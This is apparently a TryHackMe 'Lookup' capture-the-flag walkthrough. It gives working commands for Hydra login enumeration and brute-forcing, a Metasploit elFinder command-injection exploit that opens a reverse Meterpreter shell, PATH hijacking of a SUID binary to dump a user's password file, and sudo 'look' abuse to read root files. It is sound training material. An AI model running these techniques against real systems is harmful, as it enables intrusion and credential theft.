# TryHackMe — Lookup | Writeup

**Difficulty:** Easy  
**Goal:** Obtain user.txt + root.txt  

---

## 1. Reconnaissance

Target: `10.114.152.124`  
Nmap scan reveals Apache 2.4.41 HTTP server on port 80, presenting a login page.

Add the target to hosts file:
```bash
echo "10.114.152.124 lookup.thm" | sudo tee -a /etc/hosts
```

---

## 2. Username Enumeration

The login page returns different error messages depending on whether the username exists:
- Valid user → `Wrong password. Please try again.`
- Invalid user → `Wrong username or password.`

This difference allows username enumeration with Hydra:
```bash
hydra -L /usr/share/seclists/Usernames/Names/names.txt \
  -p test lookup.thm \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username or password" \
  -t 30
```

**Result:** Two valid users found: `admin` and `jose`.

---

## 3. Password Brute-Force

The `admin` user returned "Wrong username or password" on further testing, so focus shifts to `jose`:

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" \
  -f -t 30
```

**Result:** `jose : password123`

---

## 4. ElFinder — Remote Code Execution

After logging in, the application redirects to `http://files.lookup.thm`.

Add the subdomain to hosts file:
```bash
echo "10.114.152.124 files.lookup.thm" | sudo tee -a /etc/hosts
```

The page hosts an **ElFinder 2.1.47** file manager, which is vulnerable to PHP command injection via the `exiftran` connector.

Exploit with Metasploit:
```bash
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS files.lookup.thm
set LHOST <tun0_ip>
set LPORT 4444
run
```

**Result:** Meterpreter session opened as `www-data`.

---

## 5. Privilege Escalation — www-data → think

### Identifying SUID binaries
```bash
find / -perm -4000 2>/dev/null
```

Notable find: `/usr/sbin/pwm` — a SUID root binary that runs the `id` command to determine the current user, then reads and outputs that user's `.passwords` file.

### Creating a fake id binary

On the attacker machine:
```bash
echo '#!/bin/bash' > /tmp/fakeid.sh
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/fakeid.sh
chmod +x /tmp/fakeid.sh
```

Upload via Meterpreter:
```bash
upload /tmp/fakeid.sh /tmp/id
```

### Running pwm as think

```bash
chmod +x /tmp/id
export PATH=/tmp:$PATH
/usr/sbin/pwm 2>/dev/null | tail -n +3 > /tmp/passwords.txt
```

The binary now believes it is running as `think` and dumps the contents of `/home/think/.passwords`.

### Finding the correct password

The password list was reviewed manually. One entry stood out immediately: `josemario.AKA(think)` — clearly hinting at the target username.

```bash
su - think
# Password: josemario.AKA(think)
```

**Result:** `think : josemario.AKA(think)`

### User flag
```bash
cat /home/think/user.txt
```

---

## 6. Privilege Escalation — think → root

Check sudo permissions:
```bash
sudo -S -l <<< "josemario.AKA(think)"
```

**Result:** `think` is allowed to run `(ALL) /usr/bin/look`

### GTFOBins — look

The `look` binary can read arbitrary files when run with sudo:
```bash
sudo /usr/bin/look '' /root/root.txt
```

**Result:** Root flag obtained. ✓

---

## Summary

| Step | Technique |
|------|-----------|
| Username enumeration | Differing HTTP login error messages |
| Password brute-force | Hydra + rockyou.txt |
| RCE | ElFinder PHP command injection (Metasploit) |
| Privesc 1 | SUID pwm binary + PATH manipulation |
| Privesc 2 | sudo look + GTFOBins |
